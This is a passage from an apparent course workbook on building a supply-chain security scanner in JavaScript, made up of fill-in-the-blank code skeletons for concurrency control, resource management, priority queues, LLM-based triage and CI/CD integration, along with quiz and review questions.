        // YOUR CODE HERE

        // 4. Generate unified report
        // YOUR CODE HERE

        return {
            package: name,
            version,
            socketResults: /* YOUR CODE */,
            snykResults: /* YOUR CODE */,
            comparison: /* YOUR CODE */,
            unifiedReport: /* YOUR CODE */
        };
    }

    generateUnifiedReport(socketResults, snykResults) {
        // Merge findings from both tools
        // YOUR CODE HERE
    }
}

// Test the analyzer
const analyzer = new ComparativeAnalyzer(
    process.env.SOCKET_API_KEY,
    process.env.SNYK_API_KEY,
    process.env.SNYK_ORG_ID
);
const comparison = await analyzer.compare('express', '4.18.2');
console.log('Unified Report:', comparison.unifiedReport);
```

**🔍 Observation Questions:**

1. When would you use Socket over Snyk?
_________________________________________________________________
2. When would you use Snyk over Socket?
_________________________________________________________________
3. What are the benefits of using both tools together?
_________________________________________________________________

#### Check Your Understanding (Module 2.3)

**Multiple Choice:**

1. Which tool focuses on behavioral analysis?
   - [ ] Snyk
   - [ ] Socket
   - [ ] Both
   - [ ] Neither

2. Which tool provides detailed CVE information?
   - [ ] Snyk
   - [ ] Socket
   - [ ] Both
   - [ ] Neither

3. Which tool is better at detecting supply chain attacks?
   - [ ] Snyk
   - [ ] Socket
   - [ ] Both
   - [ ] Neither

**Short Answer:**

4. What is the main difference between Socket and Snyk's approaches?
_________________________________________________________________
5. Why would you use both tools in your security pipeline?
_________________________________________________________________
6. What information does Socket provide that Snyk doesn't?
_________________________________________________________________

---

### Module 2.4: Module 2 Review

#### Self-Assessment

Rate your understanding of each topic (1 = Need Help, 5 = Expert):

| Topic | 1 | 2 | 3 | 4 | 5 |
|-------|---|---|---|---|---|
| Package Manifest Analysis | ○ | ○ | ○ | ○ | ○ |
| Dependency Confusion Detection | ○ | ○ | ○ | ○ | ○ |
| Capability Scanning | ○ | ○ | ○ | ○ | ○ |
| Typosquatting Detection | ○ | ○ | ○ | ○ | ○ |
| Socket Integration | ○ | ○ | ○ | ○ | ○ |
| Snyk Integration | ○ | ○ | ○ | ○ | ○ |
| Comparative Analysis | ○ | ○ | ○ | ○ | ○ |

#### Module 2 Challenge Problems

**Challenge 1: Dependency Tree Analyzer**

Write a function that analyzes a dependency tree and identifies the most vulnerable paths.

```javascript
function analyzeDependencyTree(tree) {
    // YOUR CODE HERE
    
    // Return { vulnerablePaths: [], riskScore: number }
}
```

**Challenge 2: Typosquatting Detector**

Implement a typosquatting detector that compares package names using Levenshtein distance.

```javascript
function detectTyposquatting(name, popularPackages) {
    // YOUR CODE HERE
    
    // Return { matches: [], riskLevel: string }
}
```

**Challenge 3: Unified Security Scanner**

Combine Socket and Snyk analysis into a single report.

```javascript
async function unifiedScan(name, version) {
    // YOUR CODE HERE
    
    // Return { unifiedReport: {}, recommendations: [] }
}
```

#### Module 2 Summary

**Key Takeaways:**

1. **Package Analysis**: Understanding package.json and lock files is essential for identifying risks.

2. **Capability Scanning**: Analyzing what packages CAN do is more important than what vulnerabilities they have.

3. **Multiple Tools**: Socket and Snyk complement each other, providing both behavioral and vulnerability coverage.

4. **Comparative Analysis**: Comparing findings from multiple tools provides a more complete picture.

5. **Unified Reporting**: Combining results into a single report helps prioritize actions.

**What's Next:** In Module 3, you'll learn about concurrency and orchestration to scale your scanning to thousands of packages.

---

## PART 3: ASYNCHRONOUS EXECUTION & SECURE ORCHESTRATION

### Module 3.1: Concurrency Patterns

#### Learning Objectives
- Understand JavaScript concurrency models
- Implement worker pools
- Manage concurrent operations
- Handle timeouts and cancellations

#### Key Concepts

**Concurrency Models**

```
┌─────────────────────────────────────────────────────────────────────┐
│                    CONCURRENCY MODELS                               │
├─────────────────────────────────────────────────────────────────────┤
│                                                                      │
│  1. Sequential Processing                                           │
│     ┌──────────┐ ┌──────────┐ ┌──────────┐                        │
│     │ Item 1   │→│ Item 2   │→│ Item 3   │                        │
│     └──────────┘ └──────────┘ └──────────┘                        │
│                                                                      │
│  2. Parallel Processing (Worker Pool)                              │
│     ┌──────────┐                                                  │
│     │ Item 1   │                                                  │
│     ├──────────┤                                                  │
│     │ Item 2   │                                                  │
│     ├──────────┤                                                  │
│     │ Item 3   │                                                  │
│     └──────────┘                                                  │
│                                                                      │
│  3. Pipeline Processing                                            │
│     ┌──────────┐ ┌──────────┐ ┌──────────┐                        │
│     │ Stage 1  │→│ Stage 2  │→│ Stage 3  │                        │
│     └──────────┘ └──────────┘ └──────────┘                        │
│     ┌──────────┐ ┌──────────┐ ┌──────────┐                        │
│     │ Item 1   │ │ Item 1   │ │ Item 1   │                        │
│     │ Item 2   │ │ Item 2   │ │ Item 2   │                        │
│     │ Item 3   │ │ Item 3   │ │ Item 3   │                        │
│     └──────────┘ └──────────┘ └──────────┘                        │
│                                                                      │
└─────────────────────────────────────────────────────────────────────┘
```

#### Code Exercise 3.1.1: Concurrency Controller

**📁 File:** `phase-3/src/concurrency-controller.js`

```javascript
// Complete the concurrency controller

class ConcurrencyController {
    constructor(options = {}) {
        this.concurrency = options.concurrency || 5;
        this.queue = [];
        this.active = 0;
        this.results = [];
        this.errors = [];
        this.options = {
            timeout: options.timeout || 30000,
            retries: options.retries || 3,
            retryDelay: options.retryDelay || 1000
        };
    }

    async process(items, processor) {
        // Initialize queue
        // YOUR CODE HERE

        // Start workers
        // YOUR CODE HERE

        // Wait for all workers
        // YOUR CODE HERE

        return {
            results: this.results,
            errors: this.errors,
            stats: this.getStats()
        };
    }

    async worker(processor) {
        // Get next item from queue
        // YOUR CODE HERE

        // Process with retry logic
        // YOUR CODE HERE

        // Handle results and errors
        // YOUR CODE HERE
    }

    getStats() {
        // Return statistics
        // YOUR CODE HERE
    }
}

// Test the controller
const controller = new ConcurrencyController({ concurrency: 3 });
const results = await controller.process(
    [1, 2, 3, 4, 5, 6, 7, 8, 9, 10],
    async (item) => {
        await new Promise(resolve => setTimeout(resolve, 1000));
        return item * 2;
    }
);
console.log('Results:', results.results);
```

**✏️ Complete the Code:**

1. Initialize the queue:
```javascript
// YOUR CODE HERE
```

2. Implement the worker function:
```javascript
// YOUR CODE HERE
```

3. Implement retry logic:
```javascript
// YOUR CODE HERE
```

**✅ Run & Verify:**
```bash
node phase-3/test-scanner.js
```

#### Lab Activity 3.1: Timeout and Cancellation

**📁 File:** `phase-3/src/concurrency-controller.js` (continued)

```javascript
// Implement timeout and cancellation

async processItem(item, processor, signal) {
    return new Promise((resolve, reject) => {
        // 1. Set up timeout
        // YOUR CODE HERE

        // 2. Set up abort handler
        // YOUR CODE HERE

        // 3. Process the item
        // YOUR CODE HERE

        // 4. Clean up
        // YOUR CODE HERE
    });
}

cancel() {
    // Cancel all active operations
    // YOUR CODE HERE
}

pause() {
    // Pause processing
    // YOUR CODE HERE
}

resume() {
    // Resume processing
    // YOUR CODE HERE
}
```

**🔍 Observation Questions:**

1. Why is timeout handling important in security scanning?
_________________________________________________________________
2. When would you use cancellation vs. pause?
_________________________________________________________________
3. What happens when an operation times out?
_________________________________________________________________

#### Check Your Understanding (Module 3.1)

**Multiple Choice:**

1. What is a worker pool?
   - [ ] A single worker processing all items
   - [ ] Multiple workers processing items in parallel
   - [ ] A queue for storing items
   - [ ] A cache for results

2. Which concurrency pattern is best for CPU-bound tasks?
   - [ ] Sequential
   - [ ] Parallel (Worker Pool)
   - [ ] Pipeline
   - [ ] Circular

3. True or False: More workers always means faster processing.
   - [ ] True
   - [ ] False

**Short Answer:**

4. What is the optimal concurrency level for a given task?
_________________________________________________________________
5. How would you handle a task that hangs indefinitely?
_________________________________________________________________
6. What are the trade-offs between concurrency and resource usage?
_________________________________________________________________

---

### Module 3.2: Resource Management

#### Learning Objectives
- Monitor system resources
- Implement resource-aware scheduling
- Prevent resource exhaustion
- Handle memory pressure gracefully

#### Key Concepts

**Resource Types to Monitor**

```
┌─────────────────────────────────────────────────────────────────────┐
│                    RESOURCE MONITORING                              │
├─────────────────────────────────────────────────────────────────────┤
│                                                                      │
│  1. Memory Usage                                                    │
│     • Total memory                                                  │
│     • Used memory                                                   │
│     • Available memory                                              │
│     • Memory pressure threshold                                    │
│                                                                      │
│  2. CPU Usage                                                       │
│     • User CPU                                                      │
│     • System CPU                                                    │
│     • Idle CPU                                                      │
│     • Load average                                                  │
│                                                                      │
│  3. File Handles                                                    │
│     • Open file descriptors                                         │
│     • Max file descriptors                                          │
│     • File handle pressure                                          │
│                                                                      │
│  4. Network Connections                                             │
│     • Active connections                                            │
│     • Connection limits                                             │
│     • Network bandwidth                                             │
│                                                                      │
└─────────────────────────────────────────────────────────────────────┘
```

#### Code Exercise 3.2.1: Resource Manager

**📁 File:** `phase-3/src/resource-manager.js`

```javascript
// Complete the resource manager

class ResourceManager {
    constructor(options = {}) {
        this.options = {
            maxMemoryPercent: options.maxMemoryPercent || 80,
            maxCpuPercent: options.maxCpuPercent || 80,
            checkInterval: options.checkInterval || 5000
        };
        
        this.metrics = {
            memory: { used: 0, total: 0, percent: 0 },
            cpu: { used: 0, percent: 0 },
            fileHandles: { current: 0, max: 0, percent: 0 }
        };
        
        this.isHealthy = true;
    }

    async updateMetrics() {
        // 1. Get memory metrics
        // YOUR CODE HERE

        // 2. Get CPU metrics
        // YOUR CODE HERE

        // 3. Get file handle metrics
        // YOUR CODE HERE

        // 4. Check health
        // YOUR CODE HERE

        return this.metrics;
    }

    checkHealth() {
        // Check if resources are within thresholds
        // YOUR CODE HERE
        
        return this.isHealthy;
    }

    async getAvailableResources() {
        // Calculate available resources
        // YOUR CODE HERE
        
        return {
            canProcess: /* YOUR CODE */,
            memoryAvailable: /* YOUR CODE */,
            cpuAvailable: /* YOUR CODE */
        };
    }

    async waitForResources(timeout = 300000) {
        // Wait until resources are available
        // YOUR CODE HERE
    }
}

// Test the resource manager
const manager = new ResourceManager();
await manager.updateMetrics();
console.log('Metrics:', manager.metrics);
console.log('Healthy:', manager.checkHealth());
```

**✏️ Complete the Code:**

1. Implement memory metrics collection:
```javascript
// YOUR CODE HERE
```

2. Implement health checking:
```javascript
// YOUR CODE HERE
```

3. Implement resource waiting:
```javascript
// YOUR CODE HERE
```

**✅ Run & Verify:**
```bash
node phase-3/test-orchestrator.js
```

#### Lab Activity 3.2: Memory-Aware Scheduling

**📁 File:** `phase-3/src/resource-manager.js` (continued)

```javascript
// Implement memory-aware scheduling

class MemoryAwareScheduler {
    constructor(manager) {
        this.manager = manager;
        this.memoryHistory = [];
        this.lastAdjustment = Date.now();
    }

    adjustConcurrency(currentConcurrency) {
        // 1. Get current memory usage
        // YOUR CODE HERE

        // 2. Calculate adjustment
        // YOUR CODE HERE

        // 3. Apply adjustment
        // YOUR CODE HERE

        return newConcurrency;
    }

    shouldThrottle() {
        // Check if we should throttle processing
        // YOUR CODE HERE
    }
}
```

**🔍 Observation Questions:**

1. Why is memory management important for package scanning?
_________________________________________________________________
2. What happens when memory pressure is high?
_________________________________________________________________
3. How can you prevent out-of-memory errors in the scanner?
_________________________________________________________________

#### Check Your Understanding (Module 3.2)

**Scenario-Based Questions:**

**Scenario 1:** Your scanner is processing 1000 packages. Memory usage is at 85%. What should you do?
_________________________________________________________________

**Scenario 2:** CPU usage is at 90% but memory usage is at 40%. How would you adjust your concurrency?
_________________________________________________________________

**Scenario 3:** You're getting "Too many open files" errors. What is the problem and how would you fix it?
_________________________________________________________________

**Short Answer:**

4. What is the relationship between concurrency and resource usage?
_________________________________________________________________
5. How would you implement graceful degradation?
_________________________________________________________________

---

### Module 3.3: Priority Queuing

#### Learning Objectives
- Implement priority-based queuing
- Manage multiple queue levels
- Handle priority inversions
- Optimize for critical packages

#### Key Concepts

**Priority Levels**

| Priority | Use Case | Example |
|----------|----------|---------|
| CRITICAL | Security patches | Known vulnerabilities |
| HIGH | Production packages | Core dependencies |
| MEDIUM | Development packages | Build tools |
| LOW | Optional packages | Documentation |
| BACKGROUND | Non-critical | Test packages |

**Queue Behavior**

- Higher priority items are processed first
- Lower priority items wait for higher priority to complete
- Priority inversion prevention (starvation prevention)

#### Code Exercise 3.3.1: Priority Queue

**📁 File:** `phase-3/src/priority-queue.js`

```javascript
// Complete the priority queue

class PriorityQueue {
    constructor(options = {}) {
        this.options = {
            priorities: options.priorities || ['critical', 'high', 'medium', 'low', 'background'],
            defaultPriority: options.defaultPriority || 'medium',
            maxSize: options.maxSize || 10000
        };
        
        // Initialize queues
        this.queues = {};
        for (const priority of this.options.priorities) {
            this.queues[priority] = [];
        }
        
        this.stats = {
            total: 0,
            processed: 0,
            failed: 0
        };
    }

    add(item, priority = this.options.defaultPriority, metadata = {}) {
        // Validate priority
        // YOUR CODE HERE

        // Check queue size
        // YOUR CODE HERE

        // Add to queue
        // YOUR CODE HERE

        return item.id;
    }

    next() {
        // Find the highest priority queue with items
        // YOUR CODE HERE

        // Return the next item
        // YOUR CODE HERE
    }

    complete(itemId) {
        // Mark item as completed
        // YOUR CODE HERE
    }

    fail(itemId, error) {
        // Mark item as failed
        // YOUR CODE HERE
    }

    getStatus() {
        // Return queue status
        // YOUR CODE HERE
    }
}

// Test the priority queue
const queue = new PriorityQueue();
queue.add({ name: 'critical-pkg' }, 'critical');
queue.add({ name: 'high-pkg' }, 'high');
queue.add({ name: 'medium-pkg' }, 'medium');
queue.add({ name: 'low-pkg' }, 'low');

let item;
while ((item = queue.next()) !== null) {
    console.log('Processing:', item.item.name);
    queue.complete(item.id);
}
```

**✏️ Complete the Code:**

1. Implement the add method:
```javascript
// YOUR CODE HERE
```

2. Implement the next method:
```javascript
// YOUR CODE HERE
```

3. Implement the getStatus method:
```javascript
// YOUR CODE HERE
```

**✅ Run & Verify:**
```bash
node phase-3/test-orchestrator.js
```

#### Lab Activity 3.3: Priority Inversion Prevention

**📁 File:** `phase-3/src/priority-queue.js` (continued)

```javascript
// Implement priority inversion prevention

class PriorityQueueWithInversionPrevention extends PriorityQueue {
    constructor(options = {}) {
        super(options);
        this.maxWaitTime = options.maxWaitTime || 300000; // 5 minutes
        this.waitTimes = {};
    }

    add(item, priority, metadata = {}) {
        // Track wait time
        // YOUR CODE HERE

        return super.add(item, priority, metadata);
    }

    next() {
        // Check for aging (priority promotion)
        // YOUR CODE HERE

        // Check for starvation
        // YOUR CODE HERE

        return super.next();
    }

    promoteItem(item) {
        // Promote an item to a higher priority
        // YOUR CODE HERE
    }

    checkStarvation() {
        // Check if any items are starved
        // YOUR CODE HERE
    }
}
```

**🔍 Observation Questions:**

1. What is priority inversion?
_________________________________________________________________
2. Why is priority aging important?
_________________________________________________________________
3. How can you prevent starvation in a priority queue?
_________________________________________________________________

#### Check Your Understanding (Module 3.3)

**Multiple Choice:**

1. Which priority level should security patches use?
   - [ ] LOW
   - [ ] MEDIUM
   - [ ] HIGH
   - [ ] CRITICAL

2. What is priority aging?
   - [ ] Increasing priority over time
   - [ ] Decreasing priority over time
   - [ ] Removing items after a time
   - [ ] Adding items to a queue

3. True or False: Lower priority items are never processed.
   - [ ] True
   - [ ] False

**Short Answer:**

4. How would you prioritize packages in a security scan?
_________________________________________________________________
5. What happens when the queue is full?
_________________________________________________________________

---

### Module 3.4: Module 3 Review

#### Self-Assessment

Rate your understanding of each topic (1 = Need Help, 5 = Expert):

| Topic | 1 | 2 | 3 | 4 | 5 |
|-------|---|---|---|---|---|
| Concurrency Patterns | ○ | ○ | ○ | ○ | ○ |
| Resource Management | ○ | ○ | ○ | ○ | ○ |
| Priority Queuing | ○ | ○ | ○ | ○ | ○ |
| Timeout and Cancellation | ○ | ○ | ○ | ○ | ○ |
| Worker Pools | ○ | ○ | ○ | ○ | ○ |
| Memory-Aware Scheduling | ○ | ○ | ○ | ○ | ○ |

#### Module 3 Challenge Problems

**Challenge 1: Scalable Scanner**

Design a scanner that can handle 10,000 packages efficiently.

```javascript
class ScalableScanner {
    constructor(options) {
        // YOUR CODE HERE
    }

    async scan(packages) {
        // YOUR CODE HERE
    }
}
```

**Challenge 2: Adaptive Concurrency**

Implement a concurrency controller that adapts to system load.

```javascript
class AdaptiveConcurrencyController {
    constructor(options) {
        // YOUR CODE HERE
    }

    async process(items, processor) {
        // YOUR CODE HERE
    }

    adjustConcurrency() {
        // YOUR CODE HERE
    }
}
```

**Challenge 3: Distributed Scanning**

Design a system for scanning packages across multiple machines.

```javascript
class DistributedScanner {
    constructor(options) {
        // YOUR CODE HERE
    }

    async scan(packages) {
        // YOUR CODE HERE
    }
}
```

#### Module 3 Summary

**Key Takeaways:**

1. **Concurrency**: Processing multiple packages in parallel dramatically improves performance.

2. **Resource Management**: Monitoring and managing resources prevents system exhaustion.

3. **Priority Queuing**: Critical packages should be processed first.

4. **Adaptability**: The system should adapt to changing resource conditions.

5. **Resilience**: Timeouts, retries, and graceful degradation ensure reliability.

**What's Next:** In Module 4, you'll integrate AI into the security pipeline for intelligent analysis and triage.

---

## PART 4: AI-AUGMENTED SOFTWARE SUPPLY CHAIN SECURITY

### Module 4.1: LLM Integration

#### Learning Objectives
- Integrate LLM APIs (OpenAI, Anthropic)
- Generate structured security analysis
- Validate AI outputs
- Handle API failures gracefully

#### Key Concepts

**LLM Integration Architecture**

```
┌─────────────────────────────────────────────────────────────────────┐
│                    LLM INTEGRATION ARCHITECTURE                     │
├─────────────────────────────────────────────────────────────────────┤
│                                                                      │
│  Input: Security Findings                                           │
│                                                                      │
│  ┌────────────────────────────────────────────────────────────┐    │
│  │  1. Prompt Engineering                                      │    │
│  │  ├─ System prompt (role and constraints)                    │    │
│  │  ├─ Task prompt (analysis request)                         │    │
│  │  └─ Output schema (expected structure)                    │    │
│  └────────────────────────────────────────────────────────────┘    │
│                              │                                      │
│  ┌────────────────────────────────────────────────────────────┐    │
│  │  2. LLM API Call                                            │    │
│  │  ├─ OpenAI API                                              │    │
│  │  ├─ Anthropic API                                           │    │
│  │  └─ Fallback to mock mode                                  │    │
│  └────────────────────────────────────────────────────────────┘    │
│                              │                                      │
│  ┌────────────────────────────────────────────────────────────┐    │
│  │  3. Response Processing                                     │    │
│  │  ├─ Parse JSON response                                     │    │
│  │  ├─ Validate against schema                                │    │
│  │  └─ Extract structured data                               │    │
│  └────────────────────────────────────────────────────────────┘    │
│                              │                                      │
│  Output: Structured Security Analysis                            │
│                                                                      │
└─────────────────────────────────────────────────────────────────────┘
```

#### Code Exercise 4.1.1: LLM Service

**📁 File:** `phase-4/src/llm-service.js`

```javascript
// Complete the LLM service

class LLMService {
    constructor(options = {}) {
        this.options = {
            provider: options.provider || 'openai',
            model: options.model || 'gpt-4-turbo-preview',
            temperature: options.temperature || 0.3,
            maxTokens: options.maxTokens || 1000,
            retries: options.retries || 2
        };
        
        this.usage = {
            totalRequests: 0,
            totalTokens: 0,
            errors: 0
        };
    }

    async analyzeSecurityIssue(data) {
        // 1. Build the prompt
        // YOUR CODE HERE

        // 2. Call the LLM
        // YOUR CODE HERE

        // 3. Parse the response
        // YOUR CODE HERE

        // 4. Validate the output
        // YOUR CODE HERE

        return {
            summary: /* YOUR CODE */,
            riskLevel: /* YOUR CODE */,
            explanation: /* YOUR CODE */,
            recommendation: /* YOUR CODE */,
            urgency: /* YOUR CODE */,
            context: /* YOUR CODE */,
            references: /* YOUR CODE */
        };
    }

    buildSecurityPrompt(data) {
        // Build a comprehensive prompt
        // YOUR CODE HERE
    }

    parseResponse(response) {
        // Parse and validate JSON response
        // YOUR CODE HERE
    }

    getSystemPrompt() {
        // Return the system prompt
        // YOUR CODE HERE
    }
}

// Test the LLM service
const llm = new LLMService({ provider: 'openai' });
const analysis = await llm.analyzeSecurityIssue({
    packageName: 'express',
    version: '4.18.2',
    capabilities: [{ type: 'FILESYSTEM', severity: 'HIGH' }],
    vulnerabilities: [{ severity: 'CRITICAL', cve: 'CVE-2023-12345' }]
});
console.log('Analysis:', analysis);
```

**✏️ Complete the Code:**

1. Build the security prompt:
```javascript
// YOUR CODE HERE
```

2. Parse the LLM response:
```javascript
// YOUR CODE HERE
```

3. Validate the response:
```javascript
// YOUR CODE HERE
```

**✅ Run & Verify:**
```bash
node phase-4/test-ai-orchestrator.js
```

#### Lab Activity 4.1: Error Handling and Fallbacks

**📁 File:** `phase-4/src/llm-service.js` (continued)

```javascript
// Implement error handling and fallbacks

async analyzeWithFallback(data) {
    try {
        // Try primary analysis
        // YOUR CODE HERE
    } catch (error) {
        // Log the error
        // YOUR CODE HERE
        
        // Use fallback analysis
        // YOUR CODE HERE
    }
}

getFallbackAnalysis(data) {
    // Return a fallback analysis
    // YOUR CODE HERE
}

mockAnalysis(data) {
    // Return a mock analysis (for development)
    // YOUR CODE HERE
}
```

**🔍 Observation Questions:**

1. Why is it important to validate AI outputs?
_________________________________________________________________
2. What should you do when the LLM API fails?
_________________________________________________________________
3. How can you handle malformed responses?
_________________________________________________________________

#### Check Your Understanding (Module 4.1)

**Multiple Choice:**

1. Which LLM provider is supported in the code?
   - [ ] OpenAI only
   - [ ] Anthropic only
   - [ ] Both OpenAI and Anthropic
   - [ ] Neither

2. What is the purpose of the system prompt?
   - [ ] To provide the user's input
   - [ ] To define the AI's role and constraints
   - [ ] To specify the output format
   - [ ] To provide examples

3. True or False: AI should make security decisions independently.
   - [ ] True
   - [ ] False

**Short Answer:**

4. Why is structured output important for AI in security?
_________________________________________________________________
5. What is the role of the schema validator?
_________________________________________________________________

---

### Module 4.2: Prompt Engineering

#### Learning Objectives
- Design effective security prompts
- Implement few-shot learning
- Use chain-of-thought reasoning
- Handle edge cases in prompts

#### Key Concepts

**Prompt Engineering Techniques**

| Technique | Description | Example |
|-----------|-------------|---------|
| System Prompt | Define role and constraints | "You are a security expert..." |
| Task Prompt | Describe the task | "Analyze this package..." |
| Few-Shot Learning | Provide examples | "Here are two examples..." |
| Chain-of-Thought | Step-by-step reasoning | "Step 1: Analyze capabilities..." |
| Output Schema | Define structure | "Return JSON with fields..." |

**Prompt Components**

```
┌─────────────────────────────────────────────────────────────────────┐
│                    PROMPT COMPONENTS                                │
├─────────────────────────────────────────────────────────────────────┤
│                                                                      │
│  1. SYSTEM PROMPT                                                   │
│     Role: "You are a security expert..."                           │
│     Constraints: "Never recommend insecure solutions..."          │
│     Style: "Be precise and technical..."                          │
│                                                                      │
│  2. TASK PROMPT                                                     │
│     Goal: "Analyze the security of this package..."               │
│     Scope: "Consider capabilities, vulnerabilities..."            │
│     Output: "Return a structured JSON report..."                  │
│                                                                      │
│  3. CONTEXT PROMPT                                                  │
│     Package Data: { name, version, capabilities... }              │
│     Context: "This is a production dependency..."                 │
│     Constraints: "Assume high security requirements..."           │
│                                                                      │
│  4. OUTPUT SCHEMA                                                   │
│     Format: "JSON with fields: summary, riskLevel..."            │
│     Examples: "Example 1: { summary: '...' }"                    │
│     Constraints: "All fields are required..."                    │
│                                                                      │
└─────────────────────────────────────────────────────────────────────┘
```

#### Code Exercise 4.2.1: Security Prompts

**📁 File:** `phase-4/src/prompt-templates.js`

```javascript
// Complete the prompt templates

class PromptTemplates {
    static getSystemPrompt() {
        // Return the system prompt
        // YOUR CODE HERE
    }

    static getTaskPrompt(data) {
        // Build the task prompt
        // YOUR CODE HERE
    }

    static getFewShotExamples() {
        // Provide few-shot examples
        // YOUR CODE HERE
    }

    static getChainOfThoughtPrompt(data) {
        // Build a chain-of-thought prompt
        // YOUR CODE HERE
    }

    static getOutputSchema() {
        // Define the output schema
        // YOUR CODE HERE
    }
}

// Test the prompt templates
console.log('System Prompt:', PromptTemplates.getSystemPrompt());
console.log('Task Prompt:', PromptTemplates.getTaskPrompt({ name: 'express' }));
```

**✏️ Complete the Code:**

1. Define the system prompt:
```javascript
// YOUR CODE HERE
```

2. Build the task prompt:
```javascript
// YOUR CODE HERE
```

3. Create few-shot examples:
```javascript
// YOUR CODE HERE
```

**✅ Run & Verify:**
```bash
node phase-4/test-ai-orchestrator.js
```

#### Lab Activity 4.2: Prompt Optimization

**📁 File:** `phase-4/src/prompt-templates.js` (continued)

```javascript
// Optimize prompts for different scenarios

class PromptOptimizer {
    constructor() {
        this.templates = {
            quick: this.quickPrompt.bind(this),
            detailed: this.detailedPrompt.bind(this),
            critical: this.criticalPrompt.bind(this)
        };
    }

    quickPrompt(data) {
        // Short, fast analysis
        // YOUR CODE HERE
    }

    detailedPrompt(data) {
        // Detailed, thorough analysis
        // YOUR CODE HERE
    }

    criticalPrompt(data) {
        // Focus on critical issues
        // YOUR CODE HERE
    }

    selectTemplate(riskLevel) {
        // Select the appropriate template
        // YOUR CODE HERE
    }
}
```

**🔍 Observation Questions:**

1. How would you prompt for different levels of detail?
_________________________________________________________________
2. What's the trade-off between prompt length and quality?
_________________________________________________________________
3. How can you ensure consistent output formatting?
_________________________________________________________________

#### Check Your Understanding (Module 4.2)

**Scenario-Based Questions:**

**Scenario 1:** You need the AI to analyze a package quickly. What type of prompt would you use?
_________________________________________________________________

**Scenario 2:** You need a detailed analysis of a critical package. What prompt technique would you use?
_________________________________________________________________

**Scenario 3:** The AI keeps generating inconsistent outputs. What would you do?
_________________________________________________________________

**Short Answer:**

4. What are the benefits of few-shot learning for security prompts?
_________________________________________________________________
5. How would you handle edge cases in prompts?
_________________________________________________________________

---

### Module 4.3: CI/CD Integration

#### Learning Objectives
- Integrate with GitHub Actions
- Implement webhook endpoints
- Send notifications (Slack, Email, Teams)
- Generate CI/CD-ready reports

#### Key Concepts

**CI/CD Integration Flow**

```
┌─────────────────────────────────────────────────────────────────────┐
│                    CI/CD INTEGRATION FLOW                           │
├─────────────────────────────────────────────────────────────────────┤
│                                                                      │
│  1. Trigger Event                                                   │
│     ├─ Push to branch                                               │
│     ├─ Pull request                                                 │
│     └─ Scheduled scan                                              │
│                                                                      │
│  2. Security Scan                                                   │
│     ├─ Run package analysis                                         │
│     ├─ Detect vulnerabilities                                       │
│     └─ Generate report                                             │
│                                                                      │
│  3. Policy Check                                                    │
│     ├─ Evaluate against policies                                    │
│     ├─ Determine action                                            │
│     └─ Generate recommendations                                    │
│                                                                      │
│  4. Decision                                                        │
│     ├─ Approve (continue)                                          │
│     ├─ Review (manual intervention)                                │
│     └─ Block (fail the build)                                     │
│                                                                      │
└─────────────────────────────────────────────────────────────────────┘
```

#### Code Exercise 4.3.1: GitHub Actions Integration

**📁 File:** `phase-4/src/github-actions-integration.js`

```javascript
// Complete the GitHub Actions integration

class GitHubActionsIntegration {
    constructor(options = {}) {
        this.options = {
            token: options.token || process.env.GITHUB_TOKEN,
            owner: options.owner || process.env.GITHUB_REPOSITORY_OWNER,
            repo: options.repo || process.env.GITHUB_REPOSITORY_NAME,
            sha: options.sha || process.env.GITHUB_SHA
        };
        
        this.octokit = new Octokit({ auth: this.options.token });
    }

    async createCheckRun(scanResults) {
        // 1. Determine conclusion
        // YOUR CODE HERE

        // 2. Build summary
        // YOUR CODE HERE

        // 3. Create check run
        // YOUR CODE HERE

        return checkRun;
    }

    async createStatusCheck(scanResults) {
        // 1. Determine state
        // YOUR CODE HERE

        // 2. Create status
        // YOUR CODE HERE

        return status;
    }

    async createComment(scanResults) {
        // 1. Build comment
        // YOUR CODE HERE

        // 2. Create comment
        // YOUR CODE HERE

        return comment;
    }

    generateCheckSummary(summary) {
        // Generate summary for check run
        // YOUR CODE HERE
    }

    determineConclusion(summary) {
        // Determine if check passes or fails
        // YOUR CODE HERE
    }
}

// Test the integration
const github = new GitHubActionsIntegration({
    token: process.env.GITHUB_TOKEN,
    owner: 'your-org',
    repo: 'your-repo',
    sha: 'abc123'
});

const results = {
    summary: {
        total: 10,
        critical: 1,
        high: 2,
        medium: 3,
        low: 4
    }
};

const checkRun = await github.createCheckRun(results);
console.log('Check Run:', checkRun);
```

**✏️ Complete the Code:**

1. Determine the conclusion:
```javascript
// YOUR CODE HERE
```

2. Build the check summary:
```javascript
// YOUR CODE HERE
```

3. Create the check run:
```javascript
// YOUR CODE HERE
```

**✅ Run & Verify:**
```bash
node phase-4/ci-cd-integration.js --github
```

#### Code Exercise 4.3.2: Webhook Server

**📁 File:** `phase-4/src/webhook-server.js`

```javascript
// Complete the webhook server

class WebhookServer {
    constructor(options = {}) {
        this.options = {
            port: options.port || 3000,
            secret: options.secret || process.env.WEBHOOK_SECRET
        };
        
        this.app = express();
        this.setupRoutes();
    }

    setupRoutes() {
        // 1. Health check
        // YOUR CODE HERE

        // 2. Webhook endpoint
        // YOUR CODE HERE

        // 3. Events endpoint
        // YOUR CODE HERE
    }

    async handleWebhook(req, res) {
        // 1. Verify signature
        // YOUR CODE HERE

        // 2. Process event
        // YOUR CODE HERE

        // 3. Send response
        // YOUR CODE HERE
    }

    verifySignature(req) {
        // Verify webhook signature
        // YOUR CODE HERE
    }

    start() {
        // Start the server
        // YOUR CODE HERE
    }
}

// Test the webhook server
const server = new WebhookServer({ port: 3000 });
server.start();
console.log('Webhook server running on port 3000');
```

**✏️ Complete the Code:**

1. Implement the health check:
```javascript
// YOUR CODE HERE
```

2. Implement the webhook handler:
```javascript
// YOUR CODE HERE
```

3. Implement signature verification:
```javascript
// YOUR CODE HERE
```

**✅ Run & Verify:**
```bash
node phase-4/ci-cd-integration.js --webhook
```

#### Lab Activity 4.3: Notification Integration

**📁 File:** `phase-4/src/notification-service.js`

```javascript
// Complete the notification service

class NotificationService {
    constructor(options = {}) {
        this.options = {
            slackWebhookUrl: options.slackWebhookUrl || process.env.SLACK_WEBHOOK_URL,
            emailHost: options.emailHost || process.env.EMAIL_HOST,
            emailUser: options.emailUser || process.env.EMAIL_USER,
            emailPass: options.emailPass || process.env.EMAIL_PASS,
            teamsWebhookUrl: options.teamsWebhookUrl || process.env.TEAMS_WEBHOOK_URL
        };
    }

    async sendAlert(alert) {
        // 1. Determine channels
        // YOUR CODE HERE

        // 2. Send to Slack
        // YOUR CODE HERE

        // 3. Send to Email
        // YOUR CODE HERE

        // 4. Send to Teams
        // YOUR CODE HERE

        return { success: true };
    }

    async sendSlackAlert(alert) {
        // Send alert to Slack
        // YOUR CODE HERE
    }

